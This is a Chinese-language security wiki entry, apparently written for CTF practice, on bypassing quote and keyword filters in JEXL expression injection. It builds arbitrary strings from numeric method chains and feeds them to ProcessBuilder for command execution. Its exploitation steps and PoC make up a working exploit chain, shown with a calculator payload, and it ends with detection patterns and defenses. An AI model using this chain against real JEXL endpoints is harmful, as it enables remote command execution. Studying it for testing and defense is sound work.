---
id: web-java-expression-jexl-no-quote-string-construction-bypass
title: JEXL 无引号/关键字过滤 bypass：用数字方法链 1.toString().charAt(0).toChars(N) + String.valueOf 构造任意字符串
type: scenario
domain: web
path: web/java/expression
technique: jexl-no-quote-numeric-method-chain-string-construction
aliases:
- JEXL 无引号
- 无引号表达式
- JEXL 数字构造字符串
- toString().charAt().toChars()
- Character.toChars
- String.valueOf(char[])
- str2Expr
- 表达式过滤 bypass
tags:
- java
- jexl
- expression-injection
- bypass
- filter-bypass
- no-quote
- string-construction
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V364-fix
  verified_at: '2026-11-09T04:09:01+08:00'
  notes: V364 核对指出版本归属错误：原文 pom 为 commons-jexl3 3.2，该版本无 JexlPermissions（3.3 才引入，3.2 用 JexlSandbox）。已把边界段与防御段的 JexlPermissions 表述改为 3.3+，并注明 3.2 及更早为 JexlSandbox；字符串构造链与 PoC 核对不变。
---

## 一句话结论

当 JEXL 表达式注入点过滤了引号（甚至同时过滤 `new(`、`get`、`forName`）时，可以用纯数字字面量的方法链凭空构造任意字符串：`1.toString()` 得到 String 实例，`.charAt(0)` 得到 Character，`.toChars(N)` 得到 `char[]`（N 为 Unicode 码点），`String.valueOf(char[])` 还原字符串；把每个字符的表达式用 `+` 拼接即可得到任意类名/命令，再配合 `new (`（`new` 后加空格）实例化 `ProcessBuilder` 执行命令，全程不需要引号。

## 原理

- **JEXL 的字面量限制**：字符串必须用引号或反引号；没有 char 字面量。过滤引号后，正常表达式无法构造字符串，也就无法给 `new()` 传类名或命令。
- **从数字得到 String**：`1.toString()` 调用 `Integer.toString()`，返回 `java.lang.String` 实例；`1.toString().class` 得到 `String.class`（`Class` 对象）。
- **从 String 得到 Character**：`String.charAt(int)` 返回 `char`（JEXL 中表现为 `java.lang.Character` 对象）；`1.toString().charAt(0).class` 得到 `Character.class`。
- **从 Character 得到 char[]**：`Character.toChars(int codePoint)` 是静态方法，JEXL 允许通过实例调用静态方法（`1.toString().charAt(0).toChars(121)`），返回 `char[]`（BMP 内长度 1，补充平面返回代理对两个 char）；`.class` 显示为 `class [C`。
- **char[] 还原 String**：`String.valueOf(char[])` 是静态方法，同样可用 String 实例调用（`1.toString().valueOf(charArray)`），得到目标字符。对于 BMP 外的码点，valueOf 会正确组合代理对。
- **拼接任意字符串**：每个字符用一个数字方法链表达式，字符之间用 `+` 连接；JEXL 的 `+` 对 String 做拼接。`str2Expr("yulate")` 会生成一长串 `1.toString().valueOf(1.toString().charAt(0).toChars(121))+...+toChars(101))`。
- **回到实例化**：如果 `new(` 子串被过滤，可写成 `new (`（`new` 与 `(` 之间加空格，JEXL 解析器仍识别为 new 关键字）；数组参数用 JEXL 数组字面量 `[...]` 或 `split`；`Runtime` 等关键字可用字符串拼接 `'Run'+'time'`（无引号场景则用对应字符表达式拼接）绕过。
- **为什么成立**：JEXL 的方法解析允许在任意对象上查找同名方法（包括静态方法），而数字字面量不受引号过滤影响；`toString/charAt/toChars/valueOf` 都是 JDK 公开方法，形成一条从“数字”到“任意字符串”的完整构造链。
- **边界**：若过滤还禁止 `.`、`toString`、`class`、`toChars` 等标识符，链会断；此时需换其他返回 String 的实例方法（如 `StringBuilder.append` 等，但仍需先有对象/字符串）。若 `new` 关键字被完全禁用（不是子串过滤），此链只能用于字符串构造，需再找反射/组件链。

## 触发条件

- JEXL 表达式注入入口，过滤规则至少包含引号（`'`、`"`、反引号），可能额外过滤 `new(`、`get`、`forName` 等关键字。
- 数字字面量与方法调用（`.`、括号）仍被允许；`toString/charAt/toChars/valueOf` 未被列黑。
- 需要实例化类时，`new` 关键字/空格形式仍可用（或已有其他实例化 gadget）。
- 命令执行/文件读取等最终动作依赖 JDK 类（ProcessBuilder/Scanner 等）在 classpath。

## 利用步骤

1. **确认过滤**：提交含引号的表达式观察报错，确认引号被过滤、数字与方法调用可用。
2. **构造 String 对象**：`1.toString().class` 应返回 `class java.lang.String`；`1.toString().charAt(0).class` 应返回 `class java.lang.Character`。
3. **构造 char[]**：`1.toString().charAt(0).toChars(121).class` 应返回 `class [C`（121 为 `y`）。
4. **还原字符**：`1.toString().valueOf(1.toString().charAt(0).toChars(121))` 应返回字符串 `y`。
5. **批量生成**：用 `str2Expr` 把目标字符串逐字符转成表达式并用 `+` 连接。
6. **实例化执行**：`new(str2Expr("java.lang.ProcessBuilder"), [str2Expr("/bin/bash"), str2Expr("-c"), str2Expr("open -a Calculator")]).start()`；若 `new(` 被过滤就写 `new (`。

## PoC

```java
// 基础验证：数字 -> String -> Character -> char[] -> String
1.toString().class                              // class java.lang.String
1.toString().charAt(0).class                    // class java.lang.Character
1.toString().charAt(0).toChars(121).class       // class [C
1.toString().valueOf(1.toString().charAt(0).toChars(121))  // "y"

// 生成器：把任意字符串转为无引号表达式
public static String str2Expr(String str) {
    StringBuilder expr = new StringBuilder();
    for (int i = 0; i < str.length(); i++) {
        expr.append("1.toString().valueOf(1.toString().charAt(0).toChars(")
            .append((int) str.charAt(i))
            .append("))");
        if (i < str.length() - 1) expr.append("+");
    }
    return expr.toString();
}

// 最终无引号命令执行（new( 被过滤时写成 new (）
String exp = "new(" + str2Expr("java.lang.ProcessBuilder") + ",[" +
             str2Expr("/bin/bash") + "," + str2Expr("-c") + "," +
             str2Expr("open -a Calculator") + "]).start()";
```

生成的表达式长度随字符串长度线性增长（每个字符约 60+ 字符），长命令会很长，必要时改用短路径/短类名（如 `sh`、`/bin/sh`）或分步写入文件。

## 变体与关联

- **简单过滤绕过**：`new (` 空格绕过 `new(` 子串过滤；数组用 `['a','b']` 或 `'a b'.split(' ')`；关键字用 `'Run'+'time'` 拼接；见 [[web-java-expression-jexl-new-processbuilder-command-exec]]（JEXL new() 命令执行）。
- **其他引擎**：SpEL 可用 `T(java.lang.String)`、OGNL 可用 `@java.lang.Runtime@getRuntime()`，无引号构造思路类似但方法链不同。
- **更严格过滤**：若 `.` 或方法名被过滤，可尝试 `1.class`、数组/集合字面量、JEXL 内置函数或上下文对象；若 `new` 被彻底禁用，需转向反射/组件 gadget。
- **边界**：JEXL 3.3+ 的 `JexlPermissions` 若禁止访问 `java.lang` 类，`toChars/valueOf` 也可能被拦（3.2 及更早使用 `JexlSandbox`，并无 `JexlPermissions` 类）；此链依赖引擎允许数字方法调用与静态方法经实例解析。

## 检测与防御

- **检测**：表达式参数中出现大量 `1.toString().charAt(0).toChars(`、`valueOf(` 重复模式、超长 `+` 拼接、`new (` 空格形式；长度/复杂度异常。
- **防御**：不要用黑名单过滤表达式；使用 `JexlPermissions` 白名单（3.3+；3.2 及更早为 `JexlSandbox`）限制可访问类与方法；禁止数字/任意对象上的静态方法解析（自定义 Uberspect/权限）；对表达式做 AST 白名单（只允许变量、算术、比较），而不是字符串替换。
- **加固**：JEXL 升级并配置最小 permissions；对表达式求值服务做沙箱；监控 Java 进程拉起的 shell 与异常长表达式。
